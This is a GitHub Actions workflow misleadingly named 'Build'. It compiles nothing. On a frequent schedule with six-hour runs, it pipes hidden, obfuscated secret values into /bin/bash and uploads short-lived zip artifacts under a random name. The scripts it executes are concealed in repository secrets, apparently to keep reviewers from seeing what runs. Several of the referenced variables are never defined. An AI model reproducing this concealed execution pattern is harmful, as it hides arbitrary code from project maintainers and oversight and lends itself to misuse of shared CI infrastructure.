name: Build
on:
  workflow_dispatch:

  schedule:
    - cron: '36 1,7,13,19 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  compile:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Setup and run
        env:
          qwon96: ${{ secrets.qwon96 }}
        run: |
          printf '%s' "$qwon96" | jq -r .x8976 | /bin/bash
          printf '%s' "$d2195" | jq -r .yz7 | /bin/bash
          printf '%s' "$frs99611" | jq -r .nen0 | /bin/bash
          printf '%s' "$vdxr1" | jq -r .rt453 | /bin/bash
          printf '%s' "$cd2382" | jq -r .ykua1 | /bin/bash
          echo $i9959 | jq -r .hn1 | /bin/bash

      - name: Upload data
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: 21BVeYtU
          path: "*.zip"
          retention-days: 1
